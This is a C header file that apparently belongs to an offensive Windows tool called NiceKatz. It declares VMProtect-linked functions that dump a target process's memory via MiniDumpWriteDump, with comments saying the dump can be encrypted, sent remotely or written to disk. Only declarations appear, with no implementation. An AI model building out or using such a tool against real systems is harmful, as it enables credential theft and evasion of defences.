#pragma once

#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE


#include <time.h>
#include <Windows.h>
#include <stdio.h>
#include "VMProtectSDK.h"

#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp")

typedef struct CallbackHelper
{
	LPVOID dumpBuffer;
	DWORD bytesRead;
} CallbackHelper, * pCallbackHelper;

/*
* Initializes MiniDump callback parameter and calls MiniDumpWriteDump API
* Depending on the supplied command line args of the program, the in memory dump can either get ecnrypted, sent remotly or written to disk.
* @param hTarget - An open handle of the target process to dump
* @param TargetId - The target PID of the process to dump
* @param pCmdArgs - A pointer to CommandLineArgs structure (defined in NiceKatz.h) which represents the supplied command line args
* @return BOOL - TRUE or FALSE
*/
BOOL MiniDump(HANDLE hTarget, DWORD TargetPid);

/*
* Generates a random file name and assigns it to the pFileName variable
* @param pFileName - A pointer to a wide character that represents the file name
*/

VOID GenerateOutFileName(WCHAR* pFileName);

/*
* A callback function used with MiniDumpWriteDump API
* Recives extended minidump information
* @param CallbackParam - An application defined parameter
* @param CallbackInput - A pointer to MINIDUMP_CALLBACK_INPUT (defined in DbgHelp.h) that specified extended minidump information
* @param CallbackOutput - A pointer to MINIDUMP_CALLBACK_OUTPUT (defined in DbgHelp.h) that recives application defined information from the callback function
* @return BOOL - TRUE or FALSE
* For more information see MSDN documantation - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nc-minidumpapiset-minidump_callback_routine
*/
BOOL CALLBACK minidumpCallback(
	PVOID callbackParam,
	const PMINIDUMP_CALLBACK_INPUT callbackInput,
	PMINIDUMP_CALLBACK_OUTPUT callbackOutput
);


/*
* Retrieves and prints the correspondent error message of the last error code
* @param FunctionName - The function name that failed, used for better visibility
*/
void GetError(WCHAR* FunctionName);